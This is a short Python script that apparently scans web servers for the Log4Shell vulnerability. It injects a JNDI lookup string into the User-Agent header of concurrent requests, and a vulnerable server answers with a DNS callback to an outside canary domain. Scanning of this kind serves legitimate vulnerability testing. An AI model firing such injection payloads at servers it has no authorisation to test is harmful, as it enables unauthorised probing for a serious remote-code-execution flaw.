import requests
import threading

# List of URLs to test
urls = ["http://example1.com", "http://example2.com"]

# The JNDI URI to test with
jndi_test_uri = "${jndi:dns://91b6fef7-8588-48d7-8b90-c8e5cd463503.dns.log4shell.tools}"

def test_url(url):
    try:
        headers = {"User-Agent": jndi_test_uri}
        response = requests.get(url, headers=headers)
        print(f"Sent request to {url}")
    except Exception as e:
        print(f"Error testing {url}: {e}")

# Use threading to test all URLs concurrently
threads = []
for url in urls:
    thread = threading.Thread(target=test_url, args=(url,))
    threads.append(thread)
    thread.start()

# Wait for all threads to finish
for thread in threads:
    thread.join()
